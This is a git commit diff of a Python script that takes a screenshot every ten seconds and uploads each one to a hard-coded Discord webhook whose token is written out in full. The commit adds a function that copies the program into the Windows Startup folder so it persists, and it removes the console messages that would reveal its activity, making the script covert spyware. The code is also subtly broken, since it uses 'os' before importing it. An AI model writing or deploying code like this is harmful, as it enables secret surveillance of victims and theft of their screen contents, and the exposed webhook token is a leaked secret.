099940e4e7e3a038cae03414912613d1b6cc01f3
someonefromdiscord <freehostlvr12@proton.me>
2024-12-01 00:36:47 +0100

    Update index.py

--- index.py
+++ index.py
@@ -1,14 +1,20 @@
+import sys
+import shutil
+
+def add_to_startup():
+    startup = os.path.join(os.getenv('APPDATA'), 'Microsoft\\Windows\\Start Menu\\Programs\\Startup')
+    shutil.copy(sys.executable, startup)
+
+if __name__ == "__main__":
+    add_to_startup()
 import pyautogui
 import time
 import os
 from discord_webhook import DiscordWebhook
-time.sleep(0.5)
-print("Loaded!")
 # Create a directory for screenshots if it doesn't exist
 screenshot_dir = "screenshots"
 if not os.path.exists(screenshot_dir):
     os.makedirs(screenshot_dir)
-
 # Discord webhook URL
 webhook_url = "https://discord.com/api/webhooks/1312530969378422816/CF1lslrfYWpimQxu-Q2N0_nXrRnGjhJ0S6Vb5jrb_aP72_FQsGU5plvixYGTXTf0-bQe"
 
@@ -24,7 +30,7 @@ def capture_and_send_screenshot(counter):
         webhook.add_file(file=f, filename=os.path.basename(filename))
         webhook.execute()
 
-    print(f"Screenshot saved and sent as {filename}")
+    os.system("echo done > com1")
 
 # Main loop to take screenshots every 10 seconds
 counter = 1
